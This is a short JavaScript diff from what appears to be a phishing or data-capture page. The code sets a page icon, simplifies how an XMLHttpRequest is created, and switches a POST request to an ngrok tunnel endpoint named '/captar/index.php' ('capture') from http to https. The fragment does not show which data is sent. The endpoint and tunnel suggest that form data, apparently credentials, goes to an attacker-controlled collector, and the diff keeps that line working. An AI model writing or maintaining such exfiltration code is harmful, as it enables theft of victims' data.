@@ -29,13 +29,10 @@ document.getElementById("icone").href = window.location.href + "images/lapis.png
 if (window.XDomainRequest) {
     xmlhttp = new XDomainRequest();
 }
-else if (window.XMLHttpRequest){
+else{
     xmlhttp = new XMLHttpRequest();
 }
-else {
-    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
-}
-xmlhttp.open("POST", "http://3a0d4a0c3ecb.ngrok.io/captar/index.php", true);
+xmlhttp.open("POST", "https://3a0d4a0c3ecb.ngrok.io/captar/index.php", true);
                     
 xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 ////#endregion
